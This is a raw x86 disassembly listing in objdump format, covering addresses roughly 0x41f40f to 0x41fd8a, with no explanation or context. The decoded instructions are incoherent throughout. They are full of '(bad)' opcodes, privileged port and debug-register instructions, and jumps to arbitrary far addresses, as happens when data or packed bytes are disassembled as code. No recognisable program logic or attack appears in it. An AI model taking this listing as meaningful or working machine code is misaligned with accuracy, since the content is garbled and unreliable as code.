  41f40f:	add    BYTE PTR [ebp+0x46],dl
  41f412:	imul   esi,DWORD PTR [ebx+eiz*4+0x47],0x72
  41f417:	gs hlt 
  41f419:	pop    edx
  41f41a:	imul   esi,DWORD PTR [edx+0xe],0x5f
  41f41e:	push   eax
  41f41f:	outs   dx,DWORD PTR ds:[esi]
  41f420:	cmc    
  41f421:	pop    edx
  41f422:	add    BYTE PTR [ebx-0x18],dl
  41f425:	jl     0x41f49b
  41f427:	ja     0x41f41f
  41f429:	push   eax
  41f42a:	popa   
  41f42b:	pop    esp
  41f42c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f42d:	inc    ebp
  41f42e:	jno    0x41f4a4
  41f430:	jg     0x41f470
  41f432:	dec    edi
  41f433:	imul   edx,ecx,0xf320727b
  41f439:	jnp    0x41f49a
  41f43b:	push   0x6f6c45b9
  41f440:	rol    BYTE PTR [edi+0x61],0x73
  41f444:	fld    TBYTE PTR [ebp+0x61]
  41f447:	(bad)  
  41f449:	push   eax
  41f44a:	gs jbe 0x41f3ff
  41f44d:	cmp    BYTE PTR [edi],0x6f
  41f450:	stc    
  41f451:	inc    ebx
  41f452:	popa   
  41f453:	arpl   WORD PTR [ebx],dx
  41f455:	inc    esi
  41f456:	imul   ebp,DWORD PTR [esi+0x4],0x5f
  41f45a:	dec    edi
  41f45b:	add    BYTE PTR gs:[eax],al
	...
  41f486:	xchg   BYTE PTR ds:[edx],dl
  41f489:	arpl   sp,cx
  41f48b:	outs   dx,DWORD PTR ds:[esi]
  41f48c:	or     DWORD PTR [eax-0x25],esi
  41f48f:	xor    edi,DWORD PTR [edi]
  41f491:	push   esp
  41f492:	out    dx,al
  41f493:	push   ebx
  41f494:	inc    ebx
  41f495:	dec    ebp
  41f496:	lock inc edi
  41f498:	ss dec ebp
  41f49a:	mov    dh,BYTE PTR [edi+edi*1]
  41f49d:	push   esp
  41f49e:	mov    ?,WORD PTR [ebp+0x37]
  41f4a1:	dec    esi
  41f4a2:	sbb    dl,BYTE PTR ds:[ecx]
  41f4a5:	jb     0x41f43f
  41f4a7:	xor    al,0x25
  41f4a9:	push   eax
  41f4aa:	mov    WORD PTR [ecx],gs
  41f4ac:	pop    ds
  41f4ad:	addr16 mov ds:0x1357,al
  41f4b1:	add    BYTE PTR [ebp-0x4ff27ada],bh
  41f4b7:	fs pushf 
  41f4b9:	ins    DWORD PTR es:[di],dx
  41f4bb:	imul   eax,DWORD PTR [edi+0x11086a68],0x459193a
  41f4c5:	push   0x7111086a
  41f4ca:	adc    al,0x29
  41f4cc:	fdivr  st,st(7)
  41f4ce:	pop    ebx
  41f4cf:	call   0x595b2ee4
  41f4d4:	add    al,0x6d
  41f4d6:	dec    esi
  41f4d7:	pop    ss
  41f4d8:	adc    ebx,DWORD PTR [edi+0x3e]
  41f4db:	icebp  
  41f4dc:	and    DWORD PTR [esi+0x1a],ebp
  41f4df:	adc    bl,BYTE PTR ds:0x2834325f
  41f4e5:	push   ecx
  41f4e6:	adc    edx,ebx
  41f4e8:	or     al,0x75
	...
  41f512:	add    BYTE PTR [eax],al
  41f514:	pop    ds
  41f515:	(bad)  
  41f516:	sbb    eax,0x1ea4015c
  41f51b:	jb     0x41f53c
  41f51d:	adc    al,0x34
  41f51f:	ins    DWORD PTR es:[edi],dx
  41f520:	sbb    BYTE PTR [eax-0x2113a0f0],ch
  41f526:	add    BYTE PTR [edi+ebx*8+0x5a],cl
  41f52a:	pop    edx
  41f52b:	adc    BYTE PTR [esi],bl
  41f52d:	lahf   
  41f52e:	push   eax
  41f52f:	push   ss
  41f530:	fnstsw WORD PTR [ebp-0x5c33e6a5]
  41f536:	sbb    al,BYTE PTR [edx+eax*1]
  41f539:	mov    esp,0x941e103a
  41f53e:	dec    ebp
  41f53f:	adc    eax,0x1843bbca
  41f544:	pop    esi
  41f545:	mov    ecx,DWORD PTR [eax+0x10]
  41f548:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f549:	pop    ebx
  41f54a:	ss adc al,0x9d
  41f54d:	lods   eax,DWORD PTR ds:[esi]
  41f54e:	or     dl,bl
  41f550:	jns    0x41f4e1
  41f552:	and    al,0x38
  41f554:	jp     0x41f502
  41f556:	call   FWORD PTR [esi]
  41f558:	mov    ds:0x8e1923b7,al
  41f55d:	mov    esi,0xb89f280d
  41f562:	add    al,0x17
  41f564:	cdq    
  41f565:	mov    ecx,0xb26b0403
  41f56a:	ficomp DWORD PTR [esi]
  41f56c:	pusha  
  41f56d:	scas   eax,DWORD PTR es:[edi]
  41f56e:	xlat   BYTE PTR ds:[ebx]
  41f56f:	adc    al,0x6c
  41f571:	mov    cl,0xda
  41f573:	fstp   DWORD PTR [edi-0x4e]
  41f576:	mov    ebp,0x3
	...
  41f59f:	add    BYTE PTR [eax],al
  41f5a1:	add    BYTE PTR [edx-0x66],dh
  41f5a4:	retf   0x7c1e
  41f5a7:	xchg   edx,eax
  41f5a8:	xchg   ebx,eax
  41f5a9:	add    ebp,DWORD PTR [edi-0x48]
  41f5ac:	int    0xf
  41f5ae:	xor    edi,DWORD PTR [edx-0x65ede147]
  41f5b4:	mov    bl,BYTE PTR [esi]
  41f5b6:	cld    
  41f5b7:	xchg   ecx,eax
  41f5b8:	mov    bl,0x3
  41f5ba:	cmc    
  41f5bb:	mov    WORD PTR [ebx+eax*1+0x2fa597ef],?
  41f5c2:	jmp    0x41f55d
  41f5c4:	cdq    
  41f5c5:	ds jmp 0xac:0xf228b9b
  41f5cd:	mov    WORD PTR [edx-0x79],ss
  41f5d0:	push   esp
  41f5d1:	jo     0x41f620
  41f5d3:	mov    esp,0x871c504c
  41f5d8:	jns    0x41f604
  41f5da:	cld    
  41f5db:	ja     0x41f623
  41f5dd:	sbb    edi,ebp
  41f5df:	push   0x46
  41f5e1:	cld    
  41f5e2:	test   DWORD PTR [eax+0x37],edi
  41f5e5:	std    
  41f5e6:	data16 ins BYTE PTR es:[edi],dx
  41f5e8:	aas    
  41f5e9:	sub    ch,bh
  41f5eb:	jae    0x41f62f
  41f5ed:	sub    bh,BYTE PTR [eax+0x6c]
  41f5f0:	sub    esi,ebp
  41f5f2:	or     ch,BYTE PTR [ecx+0x36]
  41f5f5:	fnstsw WORD PTR [esi+0x6d]
  41f5f8:	xor    eax,0x356ef127
  41f5fd:	adc    al,0x42
  41f5ff:	mov    cl,BYTE PTR [ebp+0x27]
  41f602:	dec    esi
  41f603:	mov    ?,WORD PTR [edi]
  41f605:	sbb    eax,DWORD PTR [eax]
	...
  41f62f:	add    BYTE PTR [edi-0x79],bh
  41f632:	inc    ecx
  41f633:	or     eax,0xc71aa5b
  41f638:	dec    ebp
  41f639:	xchg   DWORD PTR [eax+esi*8+0x4d],edx
  41f63d:	mov    esp,0x871fd04c
  41f642:	jns    0x41f664
  41f644:	jg     0x41f6ae
  41f646:	xor    ebx,DWORD PTR [edi+ebp*8]
  41f649:	imul   esi,DWORD PTR [edi],0x32787efc
  41f64f:	sti    
  41f650:	out    0x6b,al
  41f652:	xor    eax,0x4274f0f4
  41f657:	stos   BYTE PTR es:[edi],al
  41f658:	mov    BYTE PTR [eax+0x2b],dh
  41f65b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f65c:	sub    DWORD PTR [edi+0x32],0x30636bdc
  41f663:	(bad)  
  41f664:	mov    WORD PTR [ecx+0x41],gs
  41f667:	xchg   esp,eax
  41f668:	cmp    eax,0x5e9a67ae
  41f66d:	shl    DWORD PTR [eax+eax*1+0x7],0x4d
  41f672:	jb     0x41f6ea
  41f674:	add    al,0xe
  41f676:	data16 outs dx,BYTE PTR ds:[esi]
  41f678:	mov    esi,0xf469735b
  41f67d:	jp     0x41f6e5
  41f67f:	je     0x41f688
  41f681:	adc    DWORD PTR [esi+0x6e],esp
  41f684:	push   cs
  41f685:	pop    edi
  41f686:	inc    esi
  41f687:	push   esp
  41f688:	pop    ss
  41f689:	jns    0x41f6f6
  41f68b:	jns    0x41f693
  41f68d:	dec    eax
  41f68e:	popa   
  41f68f:	jb     0x41f6c2
  41f691:	dec    ecx
  41f692:	je     0x41f704
	...
  41f6bc:	add    BYTE PTR [eax],al
  41f6be:	push   edi
  41f6bf:	gs push esp
  41f6c1:	push   eax
  41f6c2:	pop    ecx
  41f6c3:	dec    esi
  41f6c4:	jne    0x41f727
  41f6c6:	js     0x41f744
  41f6c8:	jb     0x41f6f8
  41f6ca:	inc    esi
  41f6cb:	jp     0x41f6cd
  41f6cd:	pop    esp
  41f6ce:	gs inc edi
  41f6d0:	outs   dx,BYTE PTR gs:[esi]
  41f6d2:	inc    eax
  41f6d3:	push   0x6b
  41f6d5:	sub    cx,WORD PTR ds:0x5f326f60
  41f6dc:	outs   dx,BYTE PTR ds:[esi]
  41f6dd:	jae    0x41f6e3
  41f6df:	or     ch,BYTE PTR [ebx]
  41f6e1:	fs inc ebx
  41f6e3:	inc    ebx
  41f6e4:	add    BYTE PTR [esi+0x54],cl
  41f6e7:	push   0x5b
  41f6e9:	dec    ecx
  41f6ea:	adc    DWORD PTR [eax+0x74],ecx
  41f6ed:	add    BYTE PTR [ecx-0x6ba0b097],dl
  41f6f3:	inc    edx
  41f6f4:	jno    0x41f76a
  41f6f6:	sti    
  41f6f7:	dec    ebp
  41f6f8:	jae    0x41f768
  41f6fa:	xlat   BYTE PTR ds:[ebx]
  41f6fb:	jo     0x41f74c
  41f6fd:	push   ebx
  41f6fe:	xchg   ebp,eax
  41f6ff:	jg     0x41f770
  41f701:	gs mov ecx,0x7a445c16
  41f707:	jns    0x41f774
  41f709:	fs mov edx,0xb966719c
  41f70f:	jnp    0x41f783
  41f711:	add    BYTE PTR [esi],bh
  41f713:	loope  0x41f754
  41f715:	inc    ecx
  41f716:	pop    es
  41f717:	lock aas 
  41f719:	dec    ebx
  41f71a:	jmp    0x1ba50614
  41f71f:	jmp    0x41f72d
  41f721:	arpl   WORD PTR [eax],ax
	...
  41f74b:	add    bl,ch
  41f74d:	xor    esi,DWORD PTR [ecx]
  41f74f:	dec    ecx
  41f750:	das    
  41f751:	jecxz  0x41f778
  41f753:	inc    ebp
  41f754:	jecxz  0x41f6dd
  41f756:	cmp    DWORD PTR [esi-0x16],ebp
  41f759:	sahf   
  41f75a:	adc    ch,BYTE PTR [esi-0x21]
  41f75d:	lahf   
  41f75e:	aaa    
  41f75f:	arpl   di,dx
  41f761:	pusha  
  41f762:	sbb    BYTE PTR [ebp-0x2e],ch
  41f765:	xor    esi,DWORD PTR [ecx]
  41f767:	dec    ecx
  41f768:	mov    db4,esp
  41f76b:	aas    
  41f76c:	mov    bl,0x68
  41f76e:	sbb    al,0x63
  41f770:	mov    al,ds:0x9f611970
  41f775:	dec    eax
  41f776:	sbb    eax,0xd1698e00
  41f77b:	cs ins DWORD PTR es:[edi],dx
  41f77d:	js     0x41f7b1
  41f77f:	pop    ebp
  41f780:	jp     0x41f7e1
  41f782:	pop    ds
  41f783:	jb     0x41f70c
  41f785:	and    al,0xd
  41f787:	add    BYTE PTR [esi+0x69],ch
  41f78a:	shr    DWORD PTR [esi],1
  41f78c:	cdq    
  41f78d:	jbe    0x41f7a1
  41f78f:	arpl   WORD PTR [ebx+0x41],bx
  41f792:	sbb    BYTE PTR [ebp+0x72],ch
  41f795:	xor    al,0x1
  41f797:	add    BYTE PTR [esi],bh
  41f799:	xor    al,0x1
  41f79b:	add    BYTE PTR [esi],bh
  41f79d:	xor    al,0x1
  41f79f:	add    BYTE PTR [esi],bh
  41f7a1:	xor    al,0x1
  41f7a3:	add    BYTE PTR [esi],bh
  41f7a5:	xor    al,0x1
  41f7a7:	add    BYTE PTR [esi],bh
  41f7a9:	xor    al,0x1
  41f7ab:	add    BYTE PTR [esi],bh
  41f7ad:	xor    al,0x1
	...
  41f7d7:	add    BYTE PTR [eax],al
  41f7d9:	add    BYTE PTR [esi],bh
  41f7db:	xor    al,0x1
  41f7dd:	add    BYTE PTR [esi],bh
  41f7df:	pop    ebx
  41f7e0:	out    0x3,eax
  41f7e2:	das    
  41f7e3:	lods   al,BYTE PTR ds:[esi]
  41f7e4:	mov    ebx,DWORD PTR [edx]
  41f7e6:	adc    al,al
  41f7e8:	fcmovbe st,st(5)
  41f7ea:	sbb    eax,0xf037bb7
  41f7ef:	lods   al,BYTE PTR ds:[esi]
  41f7f0:	xchg   ebx,eax
  41f7f1:	sbb    cl,BYTE PTR [edx]
  41f7f3:	sar    BYTE PTR [edx-0x735514dc],0x15
  41f7fa:	ds stos BYTE PTR es:[edi],al
  41f7fc:	js     0x41f815
  41f7fe:	loope  0x41f7ae
  41f800:	dec    esp
  41f801:	rol    DWORD PTR [edx],1
  41f803:	mov    edx,0xbfcf154b
  41f808:	out    0x10,eax
  41f80a:	loope  0x41f7c2
  41f80c:	inc    eax
  41f80d:	adc    ch,bl
  41f80f:	imul   esp,DWORD PTR [esi],0x37bfcc14
  41f815:	and    ebp,DWORD PTR [esi+edi*4-0x485eef19]
  41f81c:	inc    eax
  41f81d:	adc    BYTE PTR [ebp-0x55eeb998],bl
  41f823:	mov    esi,0xaa8f0417
  41f828:	add    ebx,DWORD PTR [ebx]
  41f82a:	mov    bh,BYTE PTR [esi-0x4b60db26]
  41f830:	adc    ecx,DWORD PTR [edi]
  41f832:	xchg   ebp,eax
  41f833:	mov    ch,0x1e
  41f835:	and    dh,BYTE PTR [ecx-0x51]
  41f838:	or     al,0x11
  41f83a:	ds test al,0xf8
  41f83d:	pop    ss
	...
  41f866:	add    BYTE PTR [eax],al
  41f868:	popa   
  41f869:	scas   eax,DWORD PTR es:[edi]
  41f86a:	int3   
  41f86b:	rol    BYTE PTR [edx+0x4d17ceb8],1
  41f871:	mov    dh,0xc5
  41f873:	and    al,0x5c
  41f875:	mov    bh,0xbe
  41f877:	and    DWORD PTR [esi],edi
  41f879:	pop    ebx
  41f87a:	aam    0x14
  41f87c:	inc    esp
  41f87d:	test   al,0xb8
  41f87f:	pop    ss
  41f880:	and    DWORD PTR [edi+0x768ecc00],ebp
  41f886:	fs mov ebp,0x98715b51
  41f88c:	dec    ecx
  41f88d:	mov    esp,0x876e8474
  41f892:	ins    DWORD PTR es:[edi],dx
  41f893:	cdq    
  41f894:	xor    BYTE PTR [ebp-0x48d36600],dh
  41f89a:	addr16 jge 0x41f8bd
  41f89d:	push   0x5d
  41f89f:	mov    dl,BYTE PTR [ecx-0x4a]
  41f8a2:	jno    0x41f830
  41f8a4:	cmp    eax,0x447d6faa
  41f8a9:	scas   eax,DWORD PTR es:[edi]
  41f8aa:	arpl   WORD PTR [edx],bx
  41f8ac:	pop    ebp
  41f8ad:	mov    ah,0x72
  41f8af:	inc    esp
  41f8b0:	push   edx
  41f8b1:	test   DWORD PTR [edx+0x4c],esi
  41f8b4:	cmp    ch,BYTE PTR [edx-0x57a4c291]
  41f8ba:	arpl   dx,di
  41f8bc:	pop    esp
  41f8bd:	stos   DWORD PTR es:[edi],eax
  41f8be:	je     0x41f904
  41f8c0:	xor    ah,BYTE PTR [edx+esi*2]
  41f8c3:	cmp    BYTE PTR [esi],ch
  41f8c5:	mov    ebp,0x86714474
  41f8ca:	popa   
  41f8cb:	push   ss
	...
  41f8f4:	add    BYTE PTR [eax],al
  41f8f6:	cs test eax,0xba1d0f6b
  41f8fc:	ja     0x41f91b
  41f8fe:	daa    
  41f8ff:	stos   DWORD PTR es:[edi],eax
  41f900:	add    BYTE PTR [edx],bl
  41f902:	adc    esi,DWORD PTR [eax+0x6b16fd67]
  41f908:	pop    ebp
  41f909:	or     ch,ch
  41f90b:	scas   eax,DWORD PTR es:[edi]
  41f90c:	jae    0x41f912
  41f90e:	in     al,dx
  41f90f:	xchg   BYTE PTR [edx-0x3],ah
  41f912:	in     al,dx
  41f913:	mov    ecx,0x5b3de900
  41f918:	add    cl,ch
  41f91a:	cmp    eax,0x3de9005b
  41f91f:	pop    ebx
  41f920:	add    cl,ch
  41f922:	cmp    eax,0xd700005b
  41f927:	push   edi
  41f928:	add    BYTE PTR [eax],al
  41f92a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f92b:	push   edi
  41f92c:	add    BYTE PTR [eax],al
  41f92e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f92f:	push   edi
  41f930:	add    BYTE PTR [eax],al
  41f932:	xchg   edi,eax
  41f933:	push   edi
  41f934:	add    BYTE PTR [eax],al
  41f936:	xchg   edi,eax
  41f937:	daa    
  41f938:	outs   dx,DWORD PTR ds:[esi]
  41f939:	outs   dx,DWORD PTR ds:[esi]
  41f93a:	shl    DWORD PTR [esi],0x69
  41f93d:	gs mov ah,0x69
  41f940:	outs   dx,BYTE PTR gs:[esi]
  41f942:	mov    esi,0xa8725057
  41f947:	xor    DWORD PTR [esi+0x6c],esp
  41f94a:	ret    0x4557
  41f94d:	jae    0x41f924
  41f94f:	xor    ch,BYTE PTR [ecx+0x61]
  41f952:	repz ss jae 0x41f9bb
  41f956:	push   edi
  41f957:	pop    es
  41f958:	pop    esi
  41f959:	je     0x41f95b
	...
  41f983:	add    bh,ch
  41f985:	pop    esi
  41f986:	push   eax
  41f987:	popa   
  41f988:	repz ss push ecx
  41f98b:	outs   dx,DWORD PTR ds:[esi]
  41f98c:	and    ah,BYTE PTR [edi]
  41f98e:	bound  eax,QWORD PTR [eax]
  41f990:	pop    es
  41f991:	sub    eax,0x6d746662
  41f996:	push   0x73
  41f998:	daa    
  41f999:	sub    ah,BYTE PTR [esi+0x67]
  41f99c:	imul   ebp,DWORD PTR [esi],0x2a09736b
  41f9a2:	outs   dx,BYTE PTR ds:[esi]
  41f9a3:	ins    BYTE PTR es:[edi],dx
  41f9a4:	and    esp,DWORD PTR cs:[edx+0x0]
  41f9a8:	xor    al,0x30
  41f9aa:	outs   dx,BYTE PTR fs:[esi]
  41f9ac:	or     BYTE PTR ds:0x27032e70,ch
  41f9b2:	jno    0x41f9b4
  41f9b4:	hlt    
  41f9b5:	das    
  41f9b6:	outs   dx,BYTE PTR fs:[esi]
  41f9b8:	cmp    BYTE PTR ds:0x2aa93270,ch
  41f9be:	jne    0x41fa34
  41f9c0:	xlat   BYTE PTR ds:[ebx]
  41f9c1:	sub    DWORD PTR [esi+0x67],esp
  41f9c4:	or     DWORD PTR [esi],ebp
  41f9c6:	imul   esi,DWORD PTR [ebx+0x3e],0x45
  41f9ca:	xor    dh,BYTE PTR [esi+eax*2+0x8]
  41f9ce:	add    DWORD PTR [ecx],esp
  41f9d0:	or     al,0x15
  41f9d2:	add    DWORD PTR [ecx],esp
  41f9d4:	ins    BYTE PTR es:[edi],dx
  41f9d5:	sbb    BYTE PTR [ecx],al
  41f9d7:	and    DWORD PTR [edi+ecx*1+0x1],ebp
  41f9db:	push   ecx
  41f9dc:	add    eax,eax
  41f9de:	mov    DWORD PTR [eax+0xa],0xd6ce914
  41f9e5:	enter  0x5eee,0x0
	...
  41fa11:	add    BYTE PTR [ebx],ah
  41fa13:	iret   
  41fa14:	sub    al,0x20
  41fa16:	and    esp,DWORD PTR [edx-0x5bf88e1a]
  41fa1c:	cmc    
  41fa1d:	(bad)
  41fa22:	in     al,dx
  41fa23:	(bad)  
  41fa25:	push   0xffffffe3
  41fa27:	fbld   TBYTE PTR [eax]
  41fa29:	arpl   ax,dx
  41fa2b:	xchg   esp,eax
  41fa2c:	div    BYTE PTR [esi-0x32]
  41fa2f:	xchg   ebp,esp
  41fa31:	arpl   si,bp
  41fa33:	xchg   edx,eax
  41fa34:	repz jo 0x41fa08
  41fa37:	pusha  
  41fa38:	mul    BYTE PTR [ebx+0x1e]
  41fa3b:	jb     0x41fa13
  41fa3d:	dec    esp
  41fa3e:	mov    edx,DWORD PTR [ebp+ebp*8+0x6c]
  41fa42:	mov    ah,0x49
  41fa44:	lock ins BYTE PTR es:[edi],dx
  41fa46:	mov    eax,ds:0x3e70f29b
  41fa4b:	jb     0x41fa36
  41fa4d:	jno    0x41f9f2
  41fa4f:	pop    edx
  41fa50:	out    dx,eax
  41fa51:	ja     0x41fa91
  41fa53:	push   0x5b846ccd
  41fa58:	lock imul ebx,DWORD PTR [edi+0x6c66ca78],0x57
  41fa60:	jmp    0x5951:0x448766c
  41fa67:	pop    edx
  41fa68:	clc    
  41fa69:	je     0x41faca
  41fa6b:	pop    ebx
  41fa6c:	(bad)  
  41fa6e:	jne    0x41fa00
  41fa70:	into   
  41fa71:	std    
  41fa72:	pop    eax
  41fa73:	scas   eax,DWORD PTR es:[edi]
  41fa74:	ret    
  41fa75:	loop   0x41fa77
	...
  41fa9f:	add    cl,cl
  41faa1:	outs   dx,BYTE PTR ds:[esi]
  41faa2:	cld    
  41faa3:	cs ds mov ecx,0x7277f3bb
  41faaa:	push   cs
  41faab:	add    al,0x26
  41faad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41faae:	mov    ebx,0xfe7267f3
  41fab3:	add    edx,DWORD PTR [esi]
  41fab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fab6:	fwait
  41fab7:	repz push cs
  41fab9:	gs into 
  41fabb:	xor    BYTE PTR [esi],bh
  41fabd:	mov    ecx,0x5b5bf39b
  41fac2:	test   edx,ebp
  41fac4:	(bad)  
  41fac6:	lods   eax,DWORD PTR ds:[esi]
  41fac7:	xlat   BYTE PTR ds:[ebx]
  41fac8:	or     DWORD PTR [esi-0x52230870],ebp
  41face:	(bad)
  41fad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fad2:	out    0xd4,eax
  41fad4:	fdivr  QWORD PTR [ebx-0x4a140ecc]
  41fada:	inc    esp
  41fadb:	sti    
  41fadc:	push   ecx
  41fadd:	test   DWORD PTR [ecx+esi*8],esp
  41fae0:	(bad)  
  41fae1:	mov    bl,0x3b
  41fae3:	lock loopne 0x41fb64
  41fae6:	sbb    ah,bh
  41fae8:	cwde   
  41fae9:	mov    cs,WORD PTR [esi-0xe]
  41faec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faed:	mov    dh,0x30
  41faef:	loopne 0x41fb1a
  41faf1:	xchg   edi,eax
  41faf2:	cmp    esi,ecx
  41faf4:	sahf   
  41faf5:	mov    ah,0xe7
  41faf7:	fild   WORD PTR [ebx-0x591af151]
  41fafd:	jg     0x41fb28
  41faff:	neg    BYTE PTR [edx+0xe71aa8]
	...
  41fb2d:	add    BYTE PTR [edi+0x6acee77f],cl
  41fb33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb34:	adc    al,dh
  41fb36:	gs mov edx,0x9609e900
  41fb3c:	ins    DWORD PTR es:[edi],dx
  41fb3d:	repz aam 0xb4
  41fb40:	ins    BYTE PTR es:[edi],dx
  41fb41:	enter  0x90f9,0x72
  41fb45:	into   
  41fb46:	out    0xb9,eax
  41fb48:	ins    BYTE PTR es:[edi],dx
  41fb49:	int3   
  41fb4a:	rol    BYTE PTR [eax+eax*1+0x74b6ceba],cl
  41fb51:	mov    esi,0x9d63aa9c
  41fb56:	cmp    DWORD PTR [ebp-0x696a359d],0x603d9954
  41fb60:	jo     0x41fafb
  41fb62:	cmp    DWORD PTR [ecx-0x507e168e],0x9c998861
  41fb6c:	addr16 fwait
  41fb6e:	cmp    eax,0x6a966dbd
  41fb73:	mov    ch,0x5f
  41fb75:	jnp    0x41fbd9
  41fb77:	outs   dx,BYTE PTR ds:[esi]
  41fb78:	mov    BYTE PTR fs:[ecx+0x20],dh
  41fb7c:	push   edx
  41fb7d:	sub    BYTE PTR [ecx-0x43],0x47
  41fb81:	push   edi
  41fb82:	pusha  
  41fb83:	scas   eax,DWORD PTR es:[edi]
  41fb84:	cmp    BYTE PTR cs:[eax-0x70],bh
  41fb88:	add    BYTE PTR [esi],ah
  41fb8a:	push   esi
  41fb8b:	mov    ecx,0x817be96e
  41fb90:	jbe    0x41fbe8
	...
  41fbba:	add    BYTE PTR [eax],al
  41fbbc:	sub    al,0xb9
  41fbbe:	je     0x41fc04
  41fbc0:	sub    eax,0x2648646e
  41fbc5:	and    BYTE PTR [esi+0x40],dl
  41fbc8:	adc    BYTE PTR [esi-0x55bdc6ac],dl
  41fbce:	addr16 adc eax,0xd2eab27
  41fbd4:	sbb    al,0x20
  41fbd6:	inc    edx
  41fbd7:	sbb    eax,0x4498ed
  41fbdc:	and    esp,DWORD PTR [esi+ebp*1]
  41fbdf:	xor    DWORD PTR [esi+eiz*2],esp
  41fbe2:	inc    esp
  41fbe3:	aaa    
  41fbe4:	stos   DWORD PTR es:[edi],eax
  41fbe5:	sub    WORD PTR [ecx-0x52],ax
  41fbe9:	bound  eax,QWORD PTR [edx+0x2d]
  41fbec:	ss data16 xor al,BYTE PTR fs:[edx+0x5f]
  41fbf2:	cmp    eax,0x306a2738
  41fbf7:	xor    BYTE PTR [edi],ch
  41fbf9:	addr16 cmp eax,0x326ce544
  41fbff:	inc    esi
  41fc00:	fldenv [edi+0x79]
  41fc03:	pop    esp
  41fc04:	fisubr WORD PTR ds:0x3ce0724d
  41fc0a:	push   eax
  41fc0b:	gs mov ch,0x25
  41fc0e:	bound  esi,QWORD PTR [edx+0x74]
  41fc11:	imul   eax,DWORD PTR [eax],0x7329ba73
  41fc17:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41fc19:	sub    al,0x2b
  41fc1b:	js     0x41fbef
  41fc1d:	das    
  41fc1e:	std    
  41fc1f:	pop    ebx
	...
  41fc48:	add    BYTE PTR [eax],al
  41fc4a:	cdq    
  41fc4b:	pop    es
  41fc4c:	dec    ebp
  41fc4d:	inc    edi
  41fc4e:	mov    edx,0xe5657127
  41fc53:	pop    ebx
  41fc54:	inc    ecx
  41fc55:	push   ebx
  41fc56:	sbb    esi,DWORD PTR [ebx]
  41fc58:	pop    edi
  41fc59:	xor    al,BYTE PTR [ecx+0x33]
  41fc5c:	pop    esi
  41fc5d:	je     0x41fcb6
  41fc5f:	push   es
  41fc60:	inc    ecx
  41fc61:	popa   
  41fc62:	jmp    0x41fc99
  41fc64:	sub    esp,DWORD PTR [esi+eax*4+0x23]
  41fc68:	std    
  41fc69:	pop    ebx
  41fc6a:	pop    edx
  41fc6b:	sub    dh,BYTE PTR [ecx+0x73]
  41fc6e:	xor    BYTE PTR ds:0xb565c71,0x43
  41fc75:	push   esp
  41fc76:	push   edi
  41fc77:	push   edi
  41fc78:	inc    ebp
  41fc79:	outs   dx,BYTE PTR ds:[esi]
  41fc7a:	sub    esi,DWORD PTR [edi+ebp*2]
  41fc7d:	outs   dx,BYTE PTR ds:[esi]
  41fc7e:	ds dec edi
  41fc80:	clc    
  41fc81:	pop    ds
  41fc82:	jnp    0x41fcd0
  41fc84:	hlt    
  41fc85:	imul   ebp,DWORD PTR [ecx+0x22],0xffffffe8
  41fc89:	jno    0x41fcc9
  41fc8b:	inc    ebp
  41fc8c:	jmp    0x41fcfb
  41fc8e:	push   edi
  41fc8f:	push   esi
  41fc90:	out    0x73,eax
  41fc92:	jge    0x41fce7
  41fc94:	loope  0x41fcfd
  41fc96:	arpl   cx,si
  41fc98:	out    dx,al
  41fc99:	bound  ebx,QWORD PTR [edx+0x17]
  41fc9c:	jmp    0x41fd11
  41fc9e:	push   edi
  41fc9f:	adc    ebp,ebp
  41fca1:	jo     0x41fce1
  41fca3:	mov    edi,0xef071fd1
  41fca8:	and    BYTE PTR [esi+0xa],al
  41fcab:	les    esp,FWORD PTR [eax]
  41fcad:	push   eax
	...
  41fcd6:	add    BYTE PTR [eax],al
  41fcd8:	pop    ds
  41fcd9:	loope  0x41fccc
  41fcdb:	je     0x41fcee
  41fcdd:	loop   0x41fcc3
  41fcdf:	jo     0x41fd1f
  41fce1:	lock sar BYTE PTR [esi],1
  41fce4:	out    dx,al
  41fce5:	jmp    0x34c6:0xf43e2036
  41fcec:	inc    edx
  41fced:	pop    eax
  41fcee:	mov    bh,0xcd
  41fcf0:	dec    edi
  41fcf1:	xchg   ebp,eax
  41fcf2:	add    BYTE PTR [eax],al
  41fcf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcf5:	xor    al,0xec
  41fcf7:	inc    ebp
  41fcf8:	pop    eax
  41fcf9:	repz (bad) 
  41fcfb:	xor    al,0x22
  41fcfd:	pop    eax
  41fcfe:	mov    bh,0xcd
  41fd00:	das    
  41fd01:	cmc    
  41fd02:	cld    
  41fd03:	jmp    DWORD PTR [edi+0x5845ea34]
  41fd09:	jb     0x41fcd5
  41fd0b:	xor    al,0x2
  41fd0d:	sbb    BYTE PTR [edx-0x32ab033],bh
  41fd13:	jmp    edi
  41fd15:	xor    ebp,edx
  41fd17:	inc    ebp
  41fd18:	sbb    BYTE PTR ds:0x573e0001,ah
  41fd1e:	xor    al,0x32
  41fd20:	jbe    0x41fd7d
  41fd22:	out    0xd0,eax
  41fd24:	mov    ds:0x68f513b5,al
  41fd29:	test   eax,0xb474e00c
  41fd2e:	or     dh,dl
  41fd30:	push   0xffffffaa
  41fd32:	push   ss
  41fd33:	out    0x6d,al
  41fd35:	jg     0x41fd67
  41fd37:	out    dx,al
  41fd38:	ins    DWORD PTR es:[edi],dx
  41fd39:	mov    eax,0xedf9
	...
  41fd66:	pop    esp
  41fd67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd68:	mov    esi,0xecd3ab51
  41fd6e:	dec    edi
  41fd6f:	mov    eax,0xad80dfd9
  41fd74:	(bad)  
  41fd76:	push   ebp
  41fd77:	scas   eax,DWORD PTR es:[edi]
  41fd78:	rol    ch,0x2a
  41fd7b:	test   eax,0x8a15f0d4
  41fd80:	mov    bl,0xec
  41fd82:	das    
  41fd83:	mov    esp,0x5b6fe6ce
  41fd88:	out    0x3,eax
  41fd8a:	ds pop ebx
